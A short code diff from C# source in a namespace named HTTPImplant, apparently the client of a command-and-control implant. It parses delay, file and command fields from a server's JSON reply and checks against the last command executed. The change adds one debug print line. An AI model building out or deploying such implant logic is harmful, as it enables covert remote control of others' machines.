@@ -43,7 +43,7 @@ namespace HTTPImplant
                         command.Delay = jsonResponse.Split(new string[] { "\"delay\":\"", "\",\"File" }, StringSplitOptions.None)[1];
                         command.File = jsonResponse.Split(new string[] { "\"File\":\"", "\",\"Command" }, StringSplitOptions.None)[1];
                         command.command = jsonResponse.Split(new string[] { "\"Command\":\"", "\"}" }, StringSplitOptions.None)[1];
-
+                        Console.WriteLine(command.File);
                         await Task.Delay(5000);
 
                         if (command.command == lastCommandExecuted)
